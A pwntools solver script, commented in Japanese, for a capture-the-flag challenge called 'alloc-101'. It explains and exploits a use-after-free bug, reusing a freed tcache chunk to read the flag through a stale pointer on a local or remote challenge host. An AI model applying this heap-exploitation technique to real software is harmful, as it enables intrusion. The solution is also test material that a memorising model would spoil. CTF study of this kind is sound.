from pwn import *

# === alloc-101 solver ===
#
# 脆弱性: Use-After-Free (UAF)
#
# free(item) の後に item = NULL していない (コメントアウトされている)
# → free 後も item ポインタが残り、read (case 3) で freed メモリを読める
#
# 攻撃手順:
# 1. allocate: f_sz と同じサイズを確保 → item = chunk A
# 2. free: chunk A を解放 → tcache に入る (item はまだ chunk A を指す)
# 3. allocate flag: malloc(f_sz) → tcache から chunk A が再利用される
#    → chunk A にフラグが書き込まれる
# 4. read: item (= chunk A) を読む → フラグが出力される

context.binary = ELF('./chall')

def conn():
    if args.REMOTE:
        return remote('34.170.146.252', 20835)
    else:
        return process('./chall')

io = conn()

# ファイルサイズを取得
io.recvuntil(b'file information: ')
f_sz = int(io.recvline().strip().split()[0])
log.info(f'Flag file size: {f_sz}')

# 1. allocate (フラグと同じサイズ)
io.sendlineafter(b'choice> ', b'1')
io.sendlineafter(b'size> ', str(f_sz).encode())
io.recvuntil(b'[DEBUG] item: ')
item_addr = io.recvline().strip()
log.info(f'item allocated at: {item_addr.decode()}')

# 2. free (item ポインタはクリアされない → UAF)
io.sendlineafter(b'choice> ', b'2')

# 3. allocate flag (同じサイズなので tcache から同じチャンクが割り当てられる)
io.sendlineafter(b'choice> ', b'4')
io.recvuntil(b'[DEBUG] flag: ')
flag_addr = io.recvline().strip()
log.info(f'flag allocated at: {flag_addr.decode()}')

# 4. read (item はまだ古いポインタを保持 → フラグが読める)
io.sendlineafter(b'choice> ', b'3')
flag = io.recvline().strip()
log.success(f'FLAG: {flag.decode()}')

io.close()
